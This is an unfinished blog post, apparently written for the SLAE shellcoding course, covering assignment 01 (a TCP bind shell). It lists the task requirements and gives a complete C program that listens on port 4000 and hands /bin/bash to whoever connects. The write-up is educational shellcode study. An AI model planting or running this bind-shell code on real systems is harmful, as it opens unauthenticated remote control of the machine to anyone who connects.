---
title: SLAE exam assignment 01
author: Stipe Marinovic
date: 2020-05-17 20:00:00 +0800
categories: [Blogging, Tutorial]
tags: [slae, shellcoding]
toc: true
---


... page still under construction ...  

# Assignment 01 #

* Create a Shell_Bind_TCP shellcode
  - Binds to a port
  - Execs Shell on incoming connection
* Port number should be easily configurable

# Syscalls #

To get idea how bind shell works and which syscalls are used, we can create bind shell code in C. After a bit of research, the simplest bind shell is following:
```
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 

int socketfd; 
int socketid; 

int main() { 

  // Define struct containing bind() arguments
  struct sockaddr_in server; 
   
  // Create socket 
  socketfd = socket(PF_INET, SOCK_STREAM, 0); 

  // Setup struct "server" containing following information: address, port and address family
  server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
  server.sin_port = htons(4000);              // port 4000
  server.sin_family = AF_INET;                // address family (ip v4)

  // Bind socket to ip 0.0.0.0, port 4000 
  bind(socketfd, (struct sockaddr*) &server, sizeof(server)); 

  // Listen for incoming connections 
  listen(socketfd, 2); 

  // Accept incoming connection 
  socketid = accept(socketfd, NULL, NULL); 

  // Bind STDIN (0), STDOUT (1), STDERR (2) to incoming connection 
  dup2(socketid, 0); 
  dup2(socketid, 1); 
  dup2(socketid, 2); 

  // Run /bin/bash shell 
  execve("/bin/bash", NULL, NULL); 
} 
```

